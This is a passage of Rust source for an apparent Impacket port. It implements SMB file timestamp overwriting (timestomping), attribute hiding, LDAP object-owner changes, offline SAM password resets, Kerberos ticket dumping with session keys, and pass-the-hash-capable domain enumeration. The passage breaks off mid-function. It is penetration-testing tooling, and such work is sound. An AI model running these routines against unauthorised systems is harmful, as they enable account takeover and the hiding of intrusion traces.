        impacket_mssql::encrypt_mode::ENCRYPT_NOT_SUP => "ENCRYPT_NOT_SUP (0x02) - Encryption not supported",
        impacket_mssql::encrypt_mode::ENCRYPT_REQ => "ENCRYPT_REQ (0x03) - Mandatory encryption enforced",
        _ => "Unknown",
    };
    println!("\n=== MSSQL TDS Status Assessment ===");
    println!("  Target Address           : {}", addr_str);
    println!("  Server Version           : {}.{}.{} (Raw build {})", v[0], v[1], u16::from_be_bytes([v[2], v[3]]), u16::from_be_bytes([v[4], v[5]]));
    println!("  TLS Encryption Mode      : {}", enc_desc);
    println!("  MARS Support             : {}", if prelogin_resp.mars != 0 { "Enabled" } else { "Disabled" });
}

fn parse_iso8601_to_unix(s: &str) -> Option<u64> {
    let clean = s.trim().trim_end_matches('Z');
    let (date_part, time_part) = if let Some(idx) = clean.find('T') {
        (&clean[..idx], &clean[idx + 1..])
    } else if let Some(idx) = clean.find(' ') {
        (&clean[..idx], &clean[idx + 1..])
    } else {
        (clean, "00:00:00")
    };
    let date_segs: Vec<&str> = date_part.split('-').collect();
    if date_segs.len() != 3 {
        return None;
    }
    let year: i64 = date_segs[0].parse().ok()?;
    let month: i64 = date_segs[1].parse().ok()?;
    let day: i64 = date_segs[2].parse().ok()?;

    let time_segs: Vec<&str> = time_part.split(':').collect();
    let hour: i64 = time_segs.first().and_then(|s| s.parse().ok()).unwrap_or(0);
    let min: i64 = time_segs.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
    let sec: i64 = time_segs.get(2).and_then(|s| s.parse().ok()).unwrap_or(0);

    let mut days = 0i64;
    for y in 1970..year {
        let leap = (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0);
        days += if leap { 366 } else { 365 };
    }
    let leap_cur = (year % 4 == 0 && year % 100 != 0) || (year % 400 == 0);
    let month_days = [31, if leap_cur { 29 } else { 28 }, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    for m in 1..month {
        days += month_days[(m - 1) as usize];
    }
    days += day - 1;

    let total_secs = days * 86400 + hour * 3600 + min * 60 + sec;
    if total_secs < 0 {
        None
    } else {
        Some(total_secs as u64)
    }
}

fn cmd_filetime(args: &[String]) {
    if args.is_empty() {
        eprintln!("Usage: impacket-rs filetime <RAW_FILETIME | ISO8601_TIMESTAMP>");
        eprintln!("   or: impacket-rs filetime <TARGET> <SHARE> <PATH> [-set <FILETIME | ISO8601>]");
        std::process::exit(1);
    }
    if args.len() == 1 {
        let arg = &args[0];
        if let Ok(raw) = arg.parse::<u64>() {
            let ft = FileTime(raw);
            let iso = ft.to_unix_secs().map(format_unix_timestamp).unwrap_or_else(|| "<invalid>".into());
            println!("Raw FILETIME (100ns) : {}", raw);
            println!("Hex representation   : 0x{:016X}", raw);
            println!("UTC ISO 8601 Date    : {}", iso);
        } else if let Some(unix) = parse_iso8601_to_unix(arg) {
            let ft = FileTime::from_unix_secs(unix);
            println!("Input Timestamp      : {}", arg);
            println!("Unix Epoch Seconds   : {}", unix);
            println!("Raw FILETIME (100ns) : {}", ft.0);
            println!("Hex representation   : 0x{:016X}", ft.0);
        } else {
            eprintln!("[-] Unrecognized timestamp format: '{}'", arg);
            std::process::exit(1);
        }
        return;
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Error parsing target: {}", e);
            std::process::exit(1);
        }
    };
    let positionals = positionals_after_target(args);
    if positionals.len() < 2 {
        eprintln!("Usage: impacket-rs filetime <TARGET> <SHARE> <PATH> [-set <TIME>]");
        std::process::exit(1);
    }
    let share = &positionals[0];
    let path = &positionals[1];

    let mut set_val: Option<u64> = None;
    let mut i = 1;
    while i < args.len() {
        if (args[i] == "-set" || args[i] == "--set") && i + 1 < args.len() {
            let val_str = &args[i + 1];
            if let Ok(raw) = val_str.parse::<u64>() {
                set_val = Some(raw);
            } else if let Some(unix) = parse_iso8601_to_unix(val_str) {
                set_val = Some(FileTime::from_unix_secs(unix).0);
            } else {
                eprintln!("[-] Invalid timestamp to set: '{}'", val_str);
                std::process::exit(1);
            }
            i += 2;
        } else {
            i += 1;
        }
    }

    let cred = match credential_from(&spec) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let host = spec.effective_target_ip();
    let mut conn = match impacket_smb::SmbConnection::connect(host, 445, spec.compat_profile, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] SMB connect error: {}", e);
            std::process::exit(1);
        }
    };
    if let Err(e) = conn.login(&spec.domain, &spec.username, &cred, "impacket-rs") {
        eprintln!("[-] SMB authentication failed: {}", e);
        std::process::exit(1);
    }
    if let Err(e) = conn.tree_connect_share(host, share) {
        eprintln!("[-] Failed connecting to share '\\\\{}\\{}': {}", host, share, e);
        std::process::exit(1);
    }

    if let Some(new_time) = set_val {
        println!("[*] Updating timestamps for '\\\\{}\\{}\\{}' to {} (0x{:016X})...", host, share, path, new_time, new_time);
        let mut info = match conn.get_file_basic_info_by_path(path) {
            Ok(inf) => inf,
            Err(e) => {
                eprintln!("[-] Failed reading current file timestamps: {}", e);
                std::process::exit(1);
            }
        };
        info.creation_time = new_time;
        info.last_access_time = new_time;
        info.last_write_time = new_time;
        info.change_time = new_time;
        if let Err(e) = conn.set_file_basic_info_by_path(path, &info) {
            eprintln!("[-] Failed setting file timestamps: {}", e);
            std::process::exit(1);
        }
        println!("[+] Timestamps successfully updated!");
    } else {
        println!("[*] Querying timestamps for '\\\\{}\\{}\\{}'...", host, share, path);
        let info = match conn.get_file_basic_info_by_path(path) {
            Ok(inf) => inf,
            Err(e) => {
                eprintln!("[-] Failed querying file timestamps: {}", e);
                std::process::exit(1);
            }
        };
        let fmt = |ft: u64| {
            FileTime(ft).to_unix_secs().map(format_unix_timestamp).unwrap_or_else(|| "<never>".into())
        };
        println!("\nFileBasicInformation for '\\\\{}\\{}\\{}':", host, share, path);
        println!("  Creation Time    : {} (raw: {})", fmt(info.creation_time), info.creation_time);
        println!("  Last Access Time : {} (raw: {})", fmt(info.last_access_time), info.last_access_time);
        println!("  Last Write Time  : {} (raw: {})", fmt(info.last_write_time), info.last_write_time);
        println!("  Change Time      : {} (raw: {})", fmt(info.change_time), info.change_time);
        println!("  Attributes Mask  : 0x{:08X}", info.file_attributes);
    }
}

fn cmd_attrib(args: &[String]) {
    if args.is_empty() {
        eprintln!("Usage: impacket-rs attrib <TARGET> <SHARE> <PATH> [+/-R] [+/-H] [+/-S] [+/-A]");
        std::process::exit(1);
    }
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Error parsing target: {}", e);
            std::process::exit(1);
        }
    };
    let positionals = positionals_after_target(args);
    if positionals.len() < 2 {
        eprintln!("Usage: impacket-rs attrib <TARGET> <SHARE> <PATH> [modifiers...]");
        std::process::exit(1);
    }
    let share = &positionals[0];
    let path = &positionals[1];

    let mut modifiers = Vec::new();
    for a in &args[1..] {
        if a.starts_with('+') || a.starts_with('-') {
            let ch = a[1..].to_uppercase();
            if ch == "R" || ch == "H" || ch == "S" || ch == "A" {
                modifiers.push((a.starts_with('+'), ch));
            }
        }
    }

    let cred = match credential_from(&spec) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let host = spec.effective_target_ip();
    let mut conn = match impacket_smb::SmbConnection::connect(host, 445, spec.compat_profile, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] SMB connect error: {}", e);
            std::process::exit(1);
        }
    };
    if let Err(e) = conn.login(&spec.domain, &spec.username, &cred, "impacket-rs") {
        eprintln!("[-] SMB authentication failed: {}", e);
        std::process::exit(1);
    }
    if let Err(e) = conn.tree_connect_share(host, share) {
        eprintln!("[-] Failed connecting to share '\\\\{}\\{}': {}", host, share, e);
        std::process::exit(1);
    }

    let mut info = match conn.get_file_basic_info_by_path(path) {
        Ok(inf) => inf,
        Err(e) => {
            eprintln!("[-] Failed reading attributes for '{}\\{}': {}", share, path, e);
            std::process::exit(1);
        }
    };

    if modifiers.is_empty() {
        let r = (info.file_attributes & impacket_smb::file_attributes::READONLY) != 0;
        let h = (info.file_attributes & impacket_smb::file_attributes::HIDDEN) != 0;
        let s = (info.file_attributes & impacket_smb::file_attributes::SYSTEM) != 0;
        let a = (info.file_attributes & impacket_smb::file_attributes::ARCHIVE) != 0;
        println!(
            "{}{}{}{}\t\\\\{}\\{}\\{}",
            if a { "A" } else { " " },
            if s { "S" } else { " " },
            if h { "H" } else { " " },
            if r { "R" } else { " " },
            host, share, path
        );
    } else {
        println!("[*] Modifying attributes for '\\\\{}\\{}\\{}'...", host, share, path);
        for (set, flag) in modifiers {
            let mask = match flag.as_str() {
                "R" => impacket_smb::file_attributes::READONLY,
                "H" => impacket_smb::file_attributes::HIDDEN,
                "S" => impacket_smb::file_attributes::SYSTEM,
                "A" => impacket_smb::file_attributes::ARCHIVE,
                _ => 0,
            };
            if set {
                info.file_attributes |= mask;
                println!("  [+] Added +{}", flag);
            } else {
                info.file_attributes &= !mask;
                println!("  [-] Cleared -{}", flag);
            }
        }
        if let Err(e) = conn.set_file_basic_info_by_path(path, &info) {
            eprintln!("[-] Failed writing updated attributes: {}", e);
            std::process::exit(1);
        }
        println!("[+] Attributes successfully applied (mask: 0x{:08X})", info.file_attributes);
    }
}

fn cmd_owneredit(args: &[String]) {
    if args.is_empty() {
        eprintln!("Usage: impacket-rs owneredit <TARGET> -dn <OBJECT_DN> [-action <query|set>] [-new-owner <SID>]");
        std::process::exit(1);
    }
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Error parsing target: {}", e);
            std::process::exit(1);
        }
    };
    let mut target_dn: Option<String> = None;
    let mut action = "query";
    let mut new_owner: Option<String> = None;
    let mut port: u16 = 389;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-dn" if i + 1 < args.len() => {
                target_dn = Some(args[i + 1].clone());
                i += 2;
            }
            "-action" if i + 1 < args.len() => {
                action = args[i + 1].as_str();
                i += 2;
            }
            "-new-owner" if i + 1 < args.len() => {
                new_owner = Some(args[i + 1].clone());
                i += 2;
            }
            "-port" if i + 1 < args.len() => {
                if let Ok(p) = args[i + 1].parse() {
                    port = p;
                }
                i += 2;
            }
            _ => i += 1,
        }
    }

    let dn = match target_dn {
        Some(d) => d,
        None => {
            eprintln!("[-] Missing mandatory object DN: provide -dn <DN>");
            std::process::exit(1);
        }
    };

    let host = spec.effective_target_ip();
    let addr = format!("{}:{}", host, port);
    println!("[*] Connecting to LDAP server at {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] Failed connecting to LDAP: {}", e);
            std::process::exit(1);
        }
    };
    let bind_dn = if spec.username.is_empty() {
        String::new()
    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
        spec.username.clone()
    } else if !spec.domain.is_empty() {
        format!("{}@{}", spec.username, spec.domain)
    } else {
        spec.username.clone()
    };
    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
    if !bind_dn.is_empty() {
        println!("[*] Binding as '{}'...", bind_dn);
        if let Err(e) = client.bind_simple(&bind_dn, password) {
            eprintln!("[-] Bind failed: {}", e);
            std::process::exit(1);
        }
        println!("[+] Bind successful");
    }

    let mut sd = match read_dacl(&mut client, &dn) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Failed reading SecurityDescriptor on '{}': {}", dn, e);
            std::process::exit(1);
        }
    };

    if let Some(ref current_owner) = sd.owner_sid {
        println!("[+] Target Object DN     : {}", dn);
        println!("[+] Current Owner SID    : {}", current_owner);
    } else {
        println!("[*] Object has no explicit owner SID.");
    }

    if action.eq_ignore_ascii_case("set") {
        let sid_str = match new_owner {
            Some(s) => s,
            None => {
                eprintln!("[-] Set action requires -new-owner <SID>");
                std::process::exit(1);
            }
        };
        let new_sid = match RpcSid::parse(&sid_str) {
            Ok(s) => s,
            Err(e) => {
                eprintln!("[-] Invalid SID string '{}': {}", sid_str, e);
                std::process::exit(1);
            }
        };
        println!("[*] Setting new owner to {}...", new_sid);
        sd.owner_sid = Some(new_sid.clone());
        if let Err(e) = write_dacl(&mut client, &dn, &sd) {
            eprintln!("[-] Failed writing updated SecurityDescriptor: {}", e);
            std::process::exit(1);
        }
        println!("[+] Owner successfully modified to {}!", new_sid);
    }
}

fn cmd_samedit(args: &[String]) {
    if args.is_empty() {
        eprintln!("Usage: impacket-rs samedit -sam <SAM_FILE> -system <SYSTEM_FILE> -user <USERNAME> -password <NEW_PASSWORD> [-out <OUTPUT_FILE>]");
        std::process::exit(1);
    }
    let mut sam_path: Option<String> = None;
    let mut system_path: Option<String> = None;
    let mut username: Option<String> = None;
    let mut new_password: Option<String> = None;
    let mut output_path: Option<String> = None;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "-sam" if i + 1 < args.len() => {
                sam_path = Some(args[i + 1].clone());
                i += 2;
            }
            "-system" if i + 1 < args.len() => {
                system_path = Some(args[i + 1].clone());
                i += 2;
            }
            "-user" if i + 1 < args.len() => {
                username = Some(args[i + 1].clone());
                i += 2;
            }
            "-password" | "-pass" if i + 1 < args.len() => {
                new_password = Some(args[i + 1].clone());
                i += 2;
            }
            "-out" if i + 1 < args.len() => {
                output_path = Some(args[i + 1].clone());
                i += 2;
            }
            _ => i += 1,
        }
    }

    let sam_file = match sam_path {
        Some(s) => s,
        None => {
            eprintln!("[-] Missing mandatory argument: -sam <SAM_FILE>");
            std::process::exit(1);
        }
    };
    let system_file = match system_path {
        Some(s) => s,
        None => {
            eprintln!("[-] Missing mandatory argument: -system <SYSTEM_FILE>");
            std::process::exit(1);
        }
    };
    let target_user = match username {
        Some(u) => u,
        None => {
            eprintln!("[-] Missing mandatory argument: -user <USERNAME>");
            std::process::exit(1);
        }
    };
    let new_pass = match new_password {
        Some(p) => p,
        None => {
            eprintln!("[-] Missing mandatory argument: -password <NEW_PASSWORD>");
            std::process::exit(1);
        }
    };

    println!("[*] Reading SAM hive from '{}'...", sam_file);
    let mut sam_bytes = match std::fs::read(&sam_file) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[-] Failed reading SAM file: {}", e);
            std::process::exit(1);
        }
    };
    println!("[*] Reading SYSTEM hive from '{}'...", system_file);
    let system_bytes = match std::fs::read(&system_file) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[-] Failed reading SYSTEM file: {}", e);
            std::process::exit(1);
        }
    };

    println!("[*] Updating NT password hash in-place for local user '{}'...", target_user);
    let rid = match impacket_sam::update_sam_user_password(&mut sam_bytes, &system_bytes, &target_user, &new_pass) {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[-] Failed modifying SAM user password: {}", e);
            std::process::exit(1);
        }
    };

    let target_save = output_path.as_ref().unwrap_or(&sam_file);
    if let Err(e) = std::fs::write(target_save, &sam_bytes) {
        eprintln!("[-] Failed saving modified SAM hive to '{}': {}", target_save, e);
        std::process::exit(1);
    }
    println!("[+] Password for user '{}' (RID {}) successfully changed!", target_user, rid);
    println!("[+] Updated SAM hive saved to '{}'", target_save);
}

fn cmd_klist(args: &[String]) {
    use impacket_core::encode_hex;
    use impacket_krb5::ccache::CCache;
    use std::env;
    use std::path::Path;

    print!("{}", version::BANNER);

    let ticket_path = if !args.is_empty() && !args[0].starts_with('-') {
        args[0].clone()
    } else if let Ok(env_path) = env::var("KRB5CCNAME") {
        env_path.trim_start_matches("FILE:").to_string()
    } else {
        let candidates = vec![
            "administrator.ccache".to_string(),
            "ticket.ccache".to_string(),
            "ticket.kirbi".to_string(),
        ];
        match candidates.into_iter().find(|p| Path::new(p).exists()) {
            Some(p) => p,
            None => {
                println!("Usage: impacket-rs klist [TICKET_FILE]");
                println!("  Lists cached Kerberos tickets, principals, validity, encryption types, and flags.");
                println!("  Reads from TICKET_FILE, $KRB5CCNAME, or default local ccache.");
                return;
            }
        }
    };

    println!("[*] Reading ticket cache from '{}'...", ticket_path);
    let raw_bytes = match std::fs::read(&ticket_path) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[-] Cannot read '{}': {}", ticket_path, e);
            std::process::exit(1);
        }
    };

    let (format_name, ccache) = if raw_bytes.first() == Some(&0x76) {
        let c = match CCache::from_kirbi(&raw_bytes) {
            Ok(c) => c,
            Err(e) => {
                eprintln!("[-] Failed parsing Mimikatz .kirbi container: {}", e);
                std::process::exit(1);
            }
        };
        ("Windows Mimikatz .kirbi (KRB-CRED)", c)
    } else {
        let c = match CCache::parse(&raw_bytes) {
            Ok(c) => c,
            Err(e) => {
                eprintln!("[-] Failed parsing MIT .ccache v4: {}", e);
                std::process::exit(1);
            }
        };
        ("MIT Kerberos .ccache v4", c)
    };

    println!("Ticket cache     : {} ({})", ticket_path, format_name);
    println!("Default principal: {}", ccache.primary_principal.to_display_string());
    println!("Valid Credentials: {}", ccache.credentials.len());
    println!();
    println!("{:<20} {:<20} {:<30}", "Valid starting", "Expires", "Service principal");
    println!("{}", "-".repeat(78));

    for cred in &ccache.credentials {
        let start_str = format_unix_timestamp(cred.times.starttime as u64);
        let end_str = format_unix_timestamp(cred.times.endtime as u64);
        let renew_str = if cred.times.renew_till > 0 {
            format_unix_timestamp(cred.times.renew_till as u64)
        } else {
            "None".to_string()
        };

        let etype_name = match cred.key.keytype {
            18 => "aes256-cts-hmac-sha1-96 (18)",
            17 => "aes128-cts-hmac-sha1-96 (17)",
            23 => "rc4-hmac (23)",
            1 => "des-cbc-crc (1)",
            3 => "des-cbc-md5 (3)",
            _ => "unknown",
        };

        let mut flags = Vec::new();
        if cred.ticket_flags & 0x4000_0000 != 0 { flags.push("FORWARDABLE"); }
        if cred.ticket_flags & 0x2000_0000 != 0 { flags.push("FORWARDED"); }
        if cred.ticket_flags & 0x1000_0000 != 0 { flags.push("PROXIABLE"); }
        if cred.ticket_flags & 0x0800_0000 != 0 { flags.push("PROXY"); }
        if cred.ticket_flags & 0x0400_0000 != 0 { flags.push("MAY-POSTDATE"); }
        if cred.ticket_flags & 0x0200_0000 != 0 { flags.push("POSTDATED"); }
        if cred.ticket_flags & 0x0100_0000 != 0 { flags.push("INVALID"); }
        if cred.ticket_flags & 0x0080_0000 != 0 { flags.push("RENEWABLE"); }
        if cred.ticket_flags & 0x0040_0000 != 0 { flags.push("INITIAL"); }
        if cred.ticket_flags & 0x0020_0000 != 0 { flags.push("PRE-AUTHENT"); }
        if cred.ticket_flags & 0x0010_0000 != 0 { flags.push("HW-AUTHENT"); }
        if cred.ticket_flags & 0x0004_0000 != 0 { flags.push("OK-AS-DELEGATE"); }
        let flags_str = if flags.is_empty() { "none".to_string() } else { flags.join(", ") };

        println!("{:<20} {:<20} {:<30}", start_str, end_str, cred.server.to_display_string());
        println!("    Renew until : {}", renew_str);
        println!("    Ticket Flags: {}", flags_str);
        println!("    Etype       : {}", etype_name);
        println!("    Ticket Size : {} bytes", cred.ticket.len());
        if !cred.key.keyvalue.is_empty() {
            println!("    Session Key : {}", encode_hex(&cred.key.keyvalue));
        }
        println!();
    }
}

fn cmd_net(args: &[String]) {
    const MAXIMUM_ALLOWED: u32 = 0x0200_0000;

    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: impacket-rs net <action> <TARGET> [options]");
        println!("  Remote Windows net.exe administrative CLI over MS-SAMR and MS-SRVS");
        println!();
        println!("Actions:");
        println!("  user       [TARGET] [-name <USER>]         Enumerate users or inspect user details");
        println!("  group      [TARGET] [-name <GROUP>]        Enumerate global groups or group members");
        println!("  localgroup [TARGET] [-name <LOCALGROUP>]   Enumerate local groups or alias members");
        println!("  share      [TARGET]                        Enumerate SMB shares");
        println!("  session    [TARGET]                        Enumerate active SMB server sessions");
        println!();
        println!("Options:");
        println!("  -hashes LM:NT      NTLM pass-the-hash authentication");
        println!("  -port <PORT>       Target port (default 445)");
        return;
    }

    let mut action = "";
    let mut target_arg: Option<String> = None;
    let mut filter_name: Option<String> = None;

    let mut rest_args = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let arg = &args[i];
        if action.is_empty() && matches!(arg.to_ascii_lowercase().as_str(), "user" | "group" | "localgroup" | "share" | "session") {
            action = match arg.to_ascii_lowercase().as_str() {
                "user" => "user",
                "group" => "group",
                "localgroup" => "localgroup",
                "share" => "share",
                "session" => "session",
                _ => "",
            };
            i += 1;
        } else if (arg == "-name" || arg == "-user" || arg == "-group") && i + 1 < args.len() {
            filter_name = Some(args[i + 1].clone());
            i += 2;
        } else if !arg.starts_with('-') && target_arg.is_none() {
            target_arg = Some(arg.clone());
            rest_args.push(arg.clone());
            i += 1;
        } else {
            rest_args.push(arg.clone());
            i += 1;
        }
    }

    if action.is_empty() {
        action = "user";
    }

    let spec = match parse_target_with_hashes(&rest_args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Target error: {}", e);
            std::process::exit(1);
        }
    };

    match action {
        "user" => {
            let transport = match open_pipe_transport(&spec, "samr", IFACE_SAMR) {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("[-] Failed connecting to \\PIPE\\samr: {}", e);
                    std::process::exit(1);
                }
            };
            let mut client = SamrClient::new(transport);
            let srv_name = format!(r"\\{}", spec.effective_target_ip());
            let srv_handle = match client.connect5(&srv_name, MAXIMUM_ALLOWED) {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("[-] SamrConnect5 failed: {}", e);
                    std::process::exit(1);
                }
            };

            let (domain_name, domain_sid) = match samr_account_domain(&spec) {
                Ok(d) => d,
                Err(e) => {
                    eprintln!("[-] Failed resolving account domain: {}", e);
                    std::process::exit(1);
                }
            };

            let dom_handle = match client.open_domain(&srv_handle, MAXIMUM_ALLOWED, &domain_sid) {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("[-] SamrOpenDomain failed: {}", e);
                    std::process::exit(1);
                }
            };

            let users = match client.enumerate_users(&dom_handle, 0) {
                Ok(u) => u,
                Err(e) => {
                    eprintln!("[-] SamrEnumerateUsersInDomain failed: {}", e);
                    std::process::exit(1);
                }
            };

            if let Some(target_user) = filter_name {
                let user_entry = users.iter().find(|u| u.name.eq_ignore_ascii_case(&target_user));
                let rid = match user_entry {
                    Some(u) => u.relative_id,
                    None => {
                        eprintln!("[-] User '{}' not found in domain '{}'.", target_user, domain_name);
                        std::process::exit(1);
                    }
                };
                let user_handle = match client.open_user(&dom_handle, MAXIMUM_ALLOWED, rid) {
                    Ok(h) => h,
                    Err(e) => {
                        eprintln!("[-] SamrOpenUser failed: {}", e);
                        std::process::exit(1);
                    }
                };
                let info = match client.query_user_all(&user_handle) {
                    Ok(i) => i,
                    Err(e) => {
                        eprintln!("[-] SamrQueryInformationUser failed: {}", e);
                        std::process::exit(1);
                    }
                };

                println!("User name                    {}", info.username);
                println!("Full Name                    {}", info.full_name);
                println!("Comment                      {}", info.admin_comment);
                println!("User's Comment               {}", "");
                println!("Country/region code          000 (System Default)");
                println!("Account active               {}", if info.account_disabled() { "No" } else { "Yes" });
                println!("Account expires              Never");
                println!();
                let pwd_last_set = info.password_last_set.to_unix_secs().map(format_unix_timestamp).unwrap_or_else(|| "<never>".into());
                println!("Password last set            {}", pwd_last_set);
                println!("Password expires             {}", if info.password_never_expires() { "Never" } else { "Subject to policy" });
                println!("Password changeable          Yes");
                println!("Password required            Yes");
                println!("User may change password     Yes");
                println!();
                println!("Workstations allowed         All");
                println!("Logon script                 ");
                println!("User profile                 ");
                println!("Home directory               ");
                println!("Last logon                   ");
                println!();
                println!("Logon hours allowed          All");
                println!("Bad password count           {}", info.bad_password_count);
                println!("Logon count                  {}", info.logon_count);
                println!("User RID                     {}", info.user_id);
                println!("Primary Group ID             {}", info.primary_group_id);
                println!("The command completed successfully.");
            } else {
                println!("User accounts for \\\\{}", spec.effective_target_ip());
                println!("{}", "-".repeat(78));
                let mut cols = Vec::new();
                for u in &users {
                    cols.push(u.name.clone());
                    if cols.len() == 3 {
                        println!("{:<25} {:<25} {:<25}", cols[0], cols[1], cols[2]);
                        cols.clear();
                    }
                }
                if !cols.is_empty() {
                    while cols.len() < 3 {
                        cols.push(String::new());
                    }
                    println!("{:<25} {:<25} {:<25}", cols[0], cols[1], cols[2]);
                }
                println!("The command completed successfully ({} users).", users.len());
            }
        }
        "group" => {
            let transport = match open_pipe_transport(&spec, "samr", IFACE_SAMR) {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("[-] Failed connecting to \\PIPE\\samr: {}", e);
                    std::process::exit(1);
                }
            };
            let mut client = SamrClient::new(transport);
            let srv_name = format!(r"\\{}", spec.effective_target_ip());
            let srv_handle = match client.connect5(&srv_name, MAXIMUM_ALLOWED) {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("[-] SamrConnect5 failed: {}", e);
                    std::process::exit(1);
                }
            };
            let (_domain_name, domain_sid) = match samr_account_domain(&spec) {
                Ok(d) => d,
                Err(e) => {
                    eprintln!("[-] Failed resolving account domain: {}", e);
                    std::process::exit(1);
                }
            };
            let dom_handle = match client.open_domain(&srv_handle, MAXIMUM_ALLOWED, &domain_sid) {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("[-] SamrOpenDomain failed: {}", e);
                    std::process::exit(1);
                }
            };
            let groups = match client.enumerate_groups(&dom_handle) {
                Ok(g) => g,
                Err(e) => {
                    eprintln!("[-] SamrEnumerateGroupsInDomain failed: {}", e);
                    std::process::exit(1);
                }
            };
            if let Some(target_group) = filter_name {
                let group_entry = groups.iter().find(|g| g.name.eq_ignore_ascii_case(&target_group));
                let rid = match group_entry {
                    Some(g) => g.relative_id,
                    None => {
                        eprintln!("[-] Group '{}' not found.", target_group);
                        std::process::exit(1);
                    }
                };
                let group_handle = match client.open_group(&dom_handle, MAXIMUM_ALLOWED, rid) {
                    Ok(h) => h,
                    Err(e) => {
                        eprintln!("[-] SamrOpenGroup failed: {}", e);
                        std::process::exit(1);
                    }
                };
                let members = match client.get_members_in_group(&group_handle) {
                    Ok(m) => m,
                    Err(e) => {
                        eprintln!("[-] SamrGetMembersInGroup failed: {}", e);
                        std::process::exit(1);
                    }
                };
                println!("Group name     *{}", target_group);
                println!("Comment        Global Domain Group (RID {})", rid);
                println!();
                println!("Members");
                println!("{}", "-".repeat(78));
                let users = client.enumerate_users(&dom_handle, 0).unwrap_or_default();
                for m_rid in members {
                    let name = users.iter().find(|u| u.relative_id == m_rid).map(|u| u.name.as_str()).unwrap_or("Unknown");
                    println!("  {} (RID {})", name, m_rid);
                }
                println!("The command completed successfully.");
            } else {
                println!("Group accounts for \\\\{}", spec.effective_target_ip());
                println!("{}", "-".repeat(78));
                for g in groups {
                    println!("*{} (RID {})", g.name, g.relative_id);
                }
                println!("The command completed successfully.");
            }
        }
        "localgroup" => {
            let transport = match open_pipe_transport(&spec, "samr", IFACE_SAMR) {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("[-] Failed connecting to \\PIPE\\samr: {}", e);
                    std::process::exit(1);
                }
            };
            let mut client = SamrClient::new(transport);
            let srv_name = format!(r"\\{}", spec.effective_target_ip());
            let srv_handle = match client.connect5(&srv_name, MAXIMUM_ALLOWED) {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("[-] SamrConnect5 failed: {}", e);
                    std::process::exit(1);
                }
            };
            let (_domain_name, domain_sid) = match samr_account_domain(&spec) {
                Ok(d) => d,
                Err(e) => {
                    eprintln!("[-] Failed resolving account domain: {}", e);
                    std::process::exit(1);
                }
            };
            let dom_handle = match client.open_domain(&srv_handle, MAXIMUM_ALLOWED, &domain_sid) {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("[-] SamrOpenDomain failed: {}", e);
                    std::process::exit(1);
                }
            };
            let aliases = match client.enumerate_aliases(&dom_handle) {
                Ok(a) => a,
                Err(e) => {
                    eprintln!("[-] SamrEnumerateAliasesInDomain failed: {}", e);
                    std::process::exit(1);
                }
            };
            if let Some(target_alias) = filter_name {
                let alias_entry = aliases.iter().find(|a| a.name.eq_ignore_ascii_case(&target_alias));
                let rid = match alias_entry {
                    Some(a) => a.relative_id,
                    None => {
                        eprintln!("[-] Local group '{}' not found.", target_alias);
                        std::process::exit(1);
                    }
                };
                let alias_handle = match client.open_alias(&dom_handle, MAXIMUM_ALLOWED, rid) {
                    Ok(h) => h,
                    Err(e) => {
                        eprintln!("[-] SamrOpenAlias failed: {}", e);
                        std::process::exit(1);
                    }
                };
                let members = match client.get_members_in_alias(&alias_handle) {
                    Ok(m) => m,
                    Err(e) => {
                        eprintln!("[-] SamrGetMembersInAlias failed: {}", e);
                        std::process::exit(1);
                    }
                };
                println!("Alias name     *{}", target_alias);
                println!("Comment        Local Group / Alias (RID {})", rid);
                println!();
                println!("Members");
                println!("{}", "-".repeat(78));
                for sid in members {
                    println!("  {}", sid);
                }
                println!("The command completed successfully.");
            } else {
                println!("Aliases for \\\\{}", spec.effective_target_ip());
                println!("{}", "-".repeat(78));
                for a in aliases {
                    println!("*{} (RID {})", a.name, a.relative_id);
                }
                println!("The command completed successfully.");
            }
        }
        "share" => {
            let transport = match open_pipe_transport(&spec, "srvsvc", IFACE_SRVS) {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("[-] Failed connecting to \\PIPE\\srvsvc: {}", e);
                    std::process::exit(1);
                }
            };
            let mut client = SrvsClient::new(transport);
            let srv_name = format!(r"\\{}", spec.effective_target_ip());
            let shares = match client.net_share_enum(&srv_name) {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("[-] NetrShareEnum failed: {}", e);
                    std::process::exit(1);
                }
            };
            println!("Share name   Type         Remark");
            println!("{}", "-".repeat(78));
            for s in shares {
